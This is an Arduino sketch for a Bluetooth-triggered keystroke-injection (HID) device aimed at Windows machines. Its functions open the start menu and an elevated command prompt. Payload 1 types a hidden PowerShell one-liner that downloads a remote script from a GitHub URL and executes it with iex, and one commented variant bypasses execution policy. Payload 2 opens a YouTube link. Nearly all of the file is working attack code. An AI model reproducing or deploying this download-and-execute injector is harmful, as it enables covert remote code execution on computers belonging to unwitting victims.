void winKey(){
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.releaseAll();
  delay(100);
}

void runBox(){
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(100);
}

void openCmd(){
  winKey();
  Keyboard.println("cmd");
  delay(100);
}
void openCmdAsAdmin(){
  winKey();
  Keyboard.print("cmd");
  delay(300);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(400);
  Keyboard.press(KEY_LEFT_ARROW);
  Keyboard.releaseAll();
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(200);
}


void payload() {
  winKey();
  //Keyboard.println("powershell.exe -windowstyle hidden -NoProfile -ExecutionPolicy Bypass -Command \"iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/robertbarrett/bluetooth-hid/master/helloworld.ps1'))\"");
  Keyboard.println("powershell.exe -windowstyle hidden -NoProfile -Command \"iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/robertbarrett/bluetooth-hid/master/helloworld.ps1'))\"");
}

void payload2() {
  winKey();
  Keyboard.println("iexplore.exe https://www.youtube.com/watch?v=5j-sY41ru4M");
}

void setup() {
  Serial3.begin (9600);
}

void loop() {
  char btRead;
  if (Serial3.available ()) {  
    btRead = Serial3.read();
    if(btRead == '1'){
       payload();
       Serial3.print("\r\nPayload 1 sent\r\n");
    }
    else if(btRead == '2'){
       payload2();
       Serial3.print("\r\nPayload 2 sent\r\n");
    }

    
  }
}
